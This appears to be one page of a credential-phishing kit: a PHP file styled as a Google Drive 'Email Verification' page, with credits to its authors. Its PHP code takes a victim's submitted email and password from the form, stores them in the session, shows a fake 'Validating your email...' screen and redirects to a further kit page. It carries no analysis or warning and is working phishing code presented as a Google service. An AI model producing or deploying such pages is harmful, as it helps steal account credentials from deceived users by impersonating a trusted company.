<?php
###################################
// Don't change anything here
// Created By TheLords
// From ninja_1263
###################################

ini_set("output_buffering",4096);
session_start();




$_SESSION['usname'] = $user = $_POST['email'];
$_SESSION['upassword'] = $pass = $_POST['phone'];



//Location: The location where the user will be redirected after the script executes the commands. You can change it.
header("");

?>
<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\">
<meta http-equiv="Refresh" content="5; URL=pvalidate.html"><title>Validating</title>

<head>
<link rel="icon" type="">


<title>Google Documents Email Verification</title>
 <link rel="stylesheet" type="text/css" href="index.css" media="all">
    <style>
button::-moz-focus-inner, input::-moz-focus-inner { border: 0px none; }
input[type=email], input[type=number], input[type=password], input[type=tel], input[type=text], input[type=url] { display: inline-block; height: 29px; margin: 0px; padding: 0px 8px; background: none repeat scroll 0% 0% rgb(255, 255, 255); border-right: 1px solid rgb(217, 217, 217); border-width: 1px; border-style: solid; border-color: rgb(192, 192, 192) rgb(217, 217, 217) rgb(217, 217, 217); -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; border-image: none; -moz-box-sizing: border-box; border-radius: 1px 1px 1px 1px; }
input[type=email]:hover, input[type=number]:hover, input[type=password]:hover, input[type=tel]:hover, input[type=text]:hover, input[type=url]:hover { border-right: 1px solid rgb(185, 185, 185); border-width: 1px; border-style: solid; border-color: rgb(160, 160, 160) rgb(185, 185, 185) rgb(185, 185, 185); -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; border-image: none; box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1) inset; }
input[type=email]:focus, input[type=number]:focus, input[type=password]:focus, input[type=tel]:focus, input[type=text]:focus, input[type=url]:focus { outline: medium none; border: 1px solid rgb(77, 144, 254); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.3) inset; }
input[type=checkbox], input[type=radio] { width: 13px; height: 13px; margin: 0px; cursor: pointer; vertical-align: bottom; background: none repeat scroll 0% 0% rgb(255, 255, 255); border: 1px solid rgb(220, 220, 220); border-radius: 1px 1px 1px 1px; -moz-box-sizing: border-box; position: relative; }
input[type=checkbox]:active, input[type=radio]:active { border-color: rgb(198, 198, 198); background: none repeat scroll 0% 0% rgb(235, 235, 235); }
input[type=checkbox]:hover { border-color: rgb(198, 198, 198); box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1) inset; }
input[type=checkbox]:checked, input[type=radio]:checked { background: none repeat scroll 0% 0% rgb(255, 255, 255); }
input[type=checkbox]:checked:after { content: url('checkmark.png'); display: block; position: absolute; top: -6px; left: -5px; }
input[type=checkbox]:focus { outline: medium none; border-color: rgb(77, 144, 254); }
.g-button { display: inline-block; min-width: 46px; text-align: center; color: rgb(68, 68, 68); font-size: 11px; font-weight: bold; height: 27px; padding: 0px 8px; line-height: 27px; border-radius: 2px 2px 2px 2px; transition: all 0.218s ease 0s ; border: 1px solid rgb(220, 220, 220); background-color: rgb(245, 245, 245); background-image: -moz-linear-gradient(center top , rgb(245, 245, 245), rgb(241, 241, 241)); -moz-user-select: none; cursor: default; }
button.g-button, input.g-button[type=submit] { height: 29px; line-height: 29px; vertical-align: bottom; margin: 0px; }
.g-button:hover { border: 1px solid rgb(198, 198, 198); color: rgb(51, 51, 51); text-decoration: none; transition: all 0s ease 0s ; background-color: rgb(248, 248, 248); background-image: -moz-linear-gradient(center top , rgb(248, 248, 248), rgb(241, 241, 241)); box-shadow: 0px 1px 1px rgba(0, 0, 0, 0.1); }
.g-button:active { background-color: rgb(246, 246, 246); background-image: -moz-linear-gradient(center top , rgb(246, 246, 246), rgb(241, 241, 241)); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.1) inset; }
.g-button-submit { border: 1px solid rgb(48, 121, 237); color: rgb(255, 255, 255); text-shadow: 0px 1px rgba(0, 0, 0, 0.1); background-color: rgb(77, 144, 254); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(71, 135, 237)); }
.g-button-submit:hover { border: 1px solid rgb(47, 91, 183); color: rgb(255, 255, 255); text-shadow: 0px 1px rgba(0, 0, 0, 0.3); background-color: rgb(53, 122, 232); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(53, 122, 232)); }
.g-button-submit:active { background-color: rgb(53, 122, 232); background-image: -moz-linear-gradient(center top , rgb(77, 144, 254), rgb(53, 122, 232)); box-shadow: 0px 1px 2px rgba(0, 0, 0, 0.3) inset; }
.sign-in { width: 335px; position: absolute; left: 248px; top: 175px;}
.signin-box, .accountchooser-box { margin: 12px 0px 0px; padding: 20px 25px 15px; background: none repeat scroll 0% 0% rgb(241, 241, 241); border: 1px solid rgb(229, 229, 229); }
.signin-box h2 { font-size: 16px; line-height: 17px; height: 16px; margin: 0px 0px 1.2em; position: relative; }
.signin-box h2 strong { display: inline-block; position: absolute; right: 0px; top: 1px; height: 19px; width: 52px; }
.signin-box div { margin: 0px 0px 1.5em; }
.signin-box input[type=email], .signin-box input[type=text], .signin-box input[type=password] { width: 100%; height: 32px; font-size: 15px; direction: ltr; }
.signin-box .email-label, .signin-box .passwd-label { font-weight: bold; margin: 0px 0px 0.5em; display: block; -moz-user-select: none; }
.signin-box label.remember { display: inline-block; vertical-align: top; margin: 9px 0px 0px; }
.signin-box .remember-label { font-weight: normal; color: rgb(102, 102, 102); line-height: 0; padding: 0px 0px 0px 0.4em; -moz-user-select: none; }
.signin-box input[type=submit] { margin: 0px 1.5em 1.2em 0px; height: 32px; font-size: 13px; }
.signin-box ul { margin: 0px;}
}

.auto-style1 {
	color: rgb(232, 12, 12);
	font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
}
    .style8 {font-size: 12px; color: #000066; }
    .style9 {
	font-size: 12px;
	color: #999999;
	font-weight: bold;
}
    .style13 {color: #000000; font-weight: bold; }
    .style14 {
	color: #666666;
	font-size: 11px;
}
    .style15 {	font-size: 10px;
	color: #FF6600;
}
    .style16 {color: #FF9900}
.style17 {
	color: #6600FF;
	font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
	font-weight: bold;
}
    </style>
</head>
<body>
    <div id="c-doc">
      <div id="c-header">
        <div id="c-header-wrapper">
          <a id="logo">
          </a>
          <a href="#" id="cust_logo">
            <img alt="Google logo" src="google_logo_41.png" width="116" height="41">
            <span class="goog-inline-block">
              Drive
            </span>
          </a>
          <ul id="c-nav">
            <li>
            </li>
            
          </ul>
          
        </div>
      </div>
      <div align="center">
        <table width="1056" border="0" cellpadding="0" cellspacing="0">
          <!--DWLayoutTable-->
          <tr>
            <td width="344" height="268" valign="top"><!--DWLayoutEmptyCell-->&nbsp;</td>
            <td width="712" valign="top"><span class="ap_col2 bold ap_radio_label"></span><span id="ap_caps_warn_span">
  <div id="ap_caps_warning" class="ap_caps_warn ap_col3_caps_warn" style="visibility:hidden;"> 
    <!--[if lt IE 7]>
  <style type="text/css">
  .ap_caps_warn {
    display: none;
  }
  </style>
  <![endif]-->
  </div>
  
               </span>
              <div id="ap_signin1a_cnep_row" class="ap_row"></div>
      
    
      <div class="ap_row"></div>

  
  <div align="center">
    <table align="left" border="0" width="501">
	<tbody><tr><td width="495" align="center" class="big11pt"><b>Validating your email...</b></td>
	</tr>
	<tr><td align="center"><img src="please_wait.gif" alt="" border="0" height="14" width="221"></td></tr>
</tbody></table></div>
            </body>
</html>
<!--DWLayoutEmptyCell-->&nbsp;</td>
          </tr>
          
          
          <tr>
            <td height="32">&nbsp;</td>
            <td>&nbsp;</td>
          </tr>
          </table>
      </div>
